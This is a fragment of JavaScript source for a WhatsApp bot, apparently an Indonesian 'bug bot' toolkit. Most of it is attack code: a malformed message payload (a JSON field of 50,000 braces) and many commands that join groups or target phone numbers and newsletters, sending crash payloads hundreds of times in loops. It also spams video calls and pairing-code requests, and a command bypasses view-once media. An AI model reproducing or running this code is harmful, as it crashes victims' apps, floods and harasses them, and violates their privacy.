    let zxv = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Hello brooo",
              hasMediaAttachment: false
            },
            body: {
              text: "See me ?", 
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(50000),     
            }
          }, 
        },
      },
    };
    
    await depayy.relayMessage(target, zxv, {
      messageId: null,
 
     userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
   //End Function Bug Group
   
//====================[ CASE BUG GROUP ]===========================//
case 'nika-delaygb': {
    if (!isPremium && !isOwner) return payreply(`Khusus Owner`);
    if (!q) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await depayy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await stcGc(isTarget)
            await stcGc(isTarget)
            await stcGc(isTarget)
            await stcGc(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await stcGc(isTarget)
            await VampireGroupInvis(isTarget)
            await stcGc(isTarget)
            await VampireGroupInvis(isTarget) 
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)            
        }
    }
}
break;

case 'nika-blankgb': {
    if (!isPremium && !isOwner) return payreply(`Khusus Owner`);
    if (!q) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await depayy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await VampireBugIns(isTarget)
            await VampireGroupInvis(isTarget)             
        }
    }
}
break;

case 'nika-killgb': {
    if (!isPremium && !isOwner) return payreply(`Khusus Owner`);
    if (!q) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await depayy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await VampireGroupInvis(isTarget)
            await stcGc(isTarget)
            await VampireBugIns(isTarget)
            await VampireGroupInvis(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await VampireGroupInvis(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
            await nikaBlankScreen(isTarget)
        }
    }
}
break;

case "nika-group": {
  try {
    if (!isPremium) return payreply(`your not access`) 
    let gcall = Object.values(await depayy.groupFetchAllParticipating().catch(_ => null));
    if (!gcall.length) return payreply("❌ Tidak ada grup yang tersedia.");
    const Ransbutton = [{
      buttonId: "action",
      buttonText: { 
        displayText: "NIKAA ATTACK GROUP" 
      },
      type: 4,
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "𝐒𝐄𝐋𝐄𝐂𝐓 𝐆𝐑𝐎𝐔𝐏",
          sections: [{
            title: `⬨ 𝐀𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤`,
            highlight_label: "© Depay",
            rows: gcall.map((u, i) => ({
              header: `${i + 1}. ${u.subject}`,
              title: `${u.participants.length} Participants`,
              description: `© NikaV11`,
              id: `.force ${u.id}` // sesuaiin case bug
            }))
          }]
        })
      },
      viewOnce: true
    }];
    const Ransmsg = {
      image:  { url: `https://files.catbox.moe/1bugyw.jpg` }, // url or buffer
      caption: `\`[ ▵ ]\` 𝐒𝐞𝐥𝐞𝐜𝐭 𝐆𝐫𝐨𝐮𝐩 𝐓𝐨 𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐀𝐭𝐭𝐚𝐜𝐤`,
      footer: '© NikaV11', 
      buttons: [
        ...Ransbutton
      ],
      headerType: 4,
      viewOnce: true
    };           
    return await depayy.sendMessage(m.chat, Ransmsg, { 
      quoted: null
    });           
  } catch (error) {
    console.error("Error in 'kunyuk' case:", error);
    return payreply(`❌ Error: ${error.message}`);
  }
}
break

case 'force': {
    if (!isPremium && !isOwner) return payreply(`Khusus Owner`);
    if (!q) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await depayy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await Kontol(isTarget)
            await Kontol(isTarget)
            await Kontol(isTarget)
            await Kontol(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await Kontol(isTarget)
            await Kontol(isTarget)
            await Kontol(isTarget)
            await Kontol(isTarget)
        }
    }
}
break;
//====================[ CASE BUG SALURAN ]===========================//
case 'nika-killch': {
if (!isOwner) return;
if (!q) return depayy.sendMessage(m.chat, { text: "Masukkan ID newsletter!\nContoh: .ch id@newsletter" }, { quoted: m });
let newsletterId = text.trim(); 
await (async () => {
for (let r = 0; r < 20; r++) {
await CrashJids(newsletterId);
await CrashJids(newsletterId);
await CrashJids(newsletterId);
}
})();
depayy.sendMessage(m.chat, { text: `✅ Berhasil mengirim Bug ke ${newsletterId}.` }, { quoted: m });
break }

case 'nika-fcsaluran': {
if (!isOwner) return;
if (!q) return depayy.sendMessage(m.chat, { text: "Masukkan ID newsletter!\nContoh: .ch id@newsletter" }, { quoted: m });
let newsletterId = text.trim(); 
await (async () => {
for (let r = 0; r < 100; r++) {
await CrashJids(newsletterId);
await CrashJids(newsletterId);
await CrashJids(newsletterId);
}
})();
depayy.sendMessage(m.chat, { text: `✅ Berhasil mengirim Bug ke ${newsletterId}.` }, { quoted: m });
break }

//====================[ CASE SPAM ]===========================//

async function sendOfferVideoCall(target) {
    try {
        await depayy.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
      
 case 'stelp':          
 case 'spamcall': { // SPAM TELP
if (!isOwner && !isPremium) return payreply(`Fitur ini Khusus Owner`) 
if (!q) {
payreply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = '62812571804@s.whatsapp.net';
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return payreply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
if (target === blockedNum) {
	payreply('*Developernya seleb kocak, gabakal diangkat telp gw👺*');
	} else {
await depayy.sendMessage(m.chat, { react: { text: "📲",key: m.key,}}),
await sleep(1500)
await depayy.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}}); 
            payreply(`*Succes spam call to target ${pepec}*`) 
            depayy.sendMessage(target, {text: `halo mass`});
for (let i = 0; i < 100; i++) {
sendOfferVideoCall(target)

await sleep(2000)
}            
 depayy.sendMessage(target, {text: `halo mass`});
}
}
    }
break   

     // Spam Pairing
case 'spampair': {
if (!isOwner) return payreply(`Fitur ini Khusus Owner`) 
if (!q) return payreply(`*Example:* ${prefix + command} +628xxxxxx|150`)
payreply('proses...')
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break

//====================[ CASE OWNER ]===========================//
case 'addowner': case 'addown':
if (!isOwner) return 
  if (!args[0]) return Reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await depayy.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return Reply(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./DataBaseNika/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./DataBaseNika/Prem.json', JSON.stringify(Premium));
  Reply(`Si binatang ini ${numero} Sukses di tambahkan menjadi owner`);
  break;

//END
//DataBaseNika CASE

case 'delowner': case 'delown':
if (!isOwner) return 
  if (!args[0]) return Reply(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./DataBaseNika/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./DataBaseNika/Prem.json', JSON.stringify(Premium));
  Reply(`Si tolol ${numero2} sukses di hapus dari owner!`);
  break;

//END
//DataBaseNika CASE

case 'addpremium': case 'addprem':
if (!isOwner) return 
  if (!args[0]) return Reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await depayy.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return Reply(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./DataBaseNika/Prem.json', JSON.stringify(Premium));
  Reply(`Si Bangsad ini ${numero} sukses menjadi premium`);
  break
  
//END
//DataBaseNika CASE


case 'delpremium': case 'delprem':
if (!isOwner) return 
  if (!args[0]) return Reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./DataBaseNika/Prem.json', JSON.stringify(Premium));
  Reply(`Si tolol ini ${numero2} sukses di hapus dari premium`);
  break;

//END
//QC CASE

case 'qc': {
  if (!q) return Reply(`Send command with text. ${prefix + command} Depayy`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await depayy.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  depayy.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

//END
  case 'sertifikattolol': {
if (args.length === 0) {
await depayy.sendMessage(m.chat, { text: "❗ Silakan masukkan teks untuk sertifikat.\n\nContoh: *.tolol Jamal*" }, { quoted: m });
break; }
const text = args.join(" ");
const imageUrl = `https://api.siputzx.my.id/api/m/sertifikat-tolol?text=${encodeURIComponent(text)}`;
try {
await depayy.sendMessage(m.chat, { 
image: { url: imageUrl }, // Kirim langsung pakai URL gambar
caption: `🖼️ *Sertifikat Tolol Untuk ${text}*`
}, { quoted: m });
} catch (error) {
console.error("Error mengambil gambar:", error.message);
await depayy.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!" }, { quoted: m })}
break; }
//PLAY CASE

case "play": {
        if (!qtext) return Reply(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          depayy.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
      
//END
//RVO CASE

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return Reply("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return Reply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return Reply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await depayy.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await depayy.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await depayy.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break

case 'hidetag': {
  if (!isOwner) return 
  if (!m.isGroup) return 
  depayy.sendMessage(from, { text: q ? q : 'Nika Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;

//END
//KICK CASE

case 'kick': {
if (!isOwner) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return Reply("Send number / tag users ");
  await depayy.groupParticipantsUpdate(from, [users], 'remove');
}
break;

case "cekidch": case "idch": {
if (!text) return Reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await depayy.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return Reply(teks)
}
break
//END
//GET LINK GROUP

case 'linkgroup': case 'linkgc': {
  if (!isOwner) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await depayy.groupInviteCode(from);
  depayy.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

//END
//RESET LINK GC CASE

case 'resetlinkgc': {
  if (!isOwner) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  depayy.groupRevokeInvite(from);
}
break;

//END
//NikaSetting CASE

case 'public': {
  if (!isOwner) return 
  depayy.public = true;
  Reply(`Success Change Mode Self To Public`);
}
break;

//END
//NikaSetting CASE

case 'self': case 'private': {
  if (!isOwner) return
  depayy.public = false;
  Reply(`Success Change Mode Public To Self`);
}
break;

//END
//TOURL CASE

case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return Reply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return Reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return Reply('Failed to download media!');
    }

    const uploadImage = require('../Library-Nika/Data6');
    const uploadFile = require('../Library-Nika/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return Reply('Failed to upload media!');
    }

    depayy.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: m });
}
break

//Bokep
		case 'hentaineko':

 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
depayy.sendMessage(m.chat, { caption: "sangean lu jir", image: { url:waifudd2.data.url } }, { quoted: m })
break
        	case 'nsfw': {
        	Reply(`Prosess Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			sock.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
//END
//STICKER CASE

case 'sticker': case 's': {
  if (!quoted) return Reply(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await depayy.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return Reply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await depayy.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return Reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
//END
//BRAT CASE

case "brat": {
             const text = q
if (!text) return payreply(
`*CaraPenggunaan* \n ${prefix + command} Depay`);
             payreply(`𝗪𝗮𝗶𝘁...`);
const imageUrl = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`;
const inputPath = path.join(__dirname, "temp_image.jpg");
const outputPath = path.join(__dirname, "sticker.webp");

try {
const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
fs.writeFileSync(inputPath, response.data);
exec(`ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`, async (error) => {
if (error) {
console.error("Gagal mengonversi gambar:", error);
return await payreply("Gagal membuat stiker");
}
await depayy.sendMessage(m.chat, { 
sticker: fs.readFileSync(outputPath),
}, { quoted: m });
fs.unlinkSync(inputPath);
fs.unlinkSync(outputPath);
});
} catch (error) {
console.error("Gagal membuat stiker:", error);
await payreply("Gagal membuat stiker");
}
}
break

//END
//TES BOT CASE
case 'tes':
case 'status': {
Reply(`*On Bang*`)
}
break

case 'tiktok': 
      case'tt':{
        if (!qtext) return Reply(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await depayy.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await depayy.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await depayy.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await depayy.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await depayy.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await depayy.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE

case 'meta-ai': {
  if (!qtext) return Reply('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await depayy.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break

case "cekganteng": {
if (!args[0]) return payreply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
payreply(teks)
}
break         

case 'cekkhodam': case 'cekkodam': {
if (!args[0]) return payreply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"pecel lele",
"kumis lele",
"Ambatron",
"Ambatukam",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Ternyata Khodam ${args[0]} adalah:* ${kdm}`
  payreply(kodamn)
}
break  
//====================[ CASE BUG INVIS FORCLOSE ]===========================//

case 'nikaximprove': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 100; i++) {
await NikaFC(target)
await NikaFC(target)
await NikaFC(target)
await NikaFC(target)
await NikaFC(target)
await NikaFC(target)
}
}
break

case 'nika-invisbeta': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 10; i++) {
await PrePortDoc(target)
await PrePortDoc(target)
}
}
break

case 'nika-forx': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 250; i++) {
await DocFC(target)
await DocFC(target)
await DocFC(target)
await DocFC(target)
await DocFC(target)
await DocFC(target)
}
}
break
//====================[ CASE BUG HARD FORCLOSE ]===========================//
case 'galaxy-impact': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 250; i++) {
await DepayForclose(target)
}
}
break

case 'spaming-forc': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 100; i++) {
await DepayForclose(target)
}
}
break

case 'nika-force': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 100; i++) {
await invisSqL(target)
await NikaFC(target) 
await PrePortDoc(target)
}
}
break
//====================[ CASE BUG BULDOZER ]===========================//
case 'nika-bulldo': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 250; i++) {
await Depaybuldozer(target)
await Depaybuldozer(target)
}
}
break

case 'nika-absorb':
case 'nika-suck': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
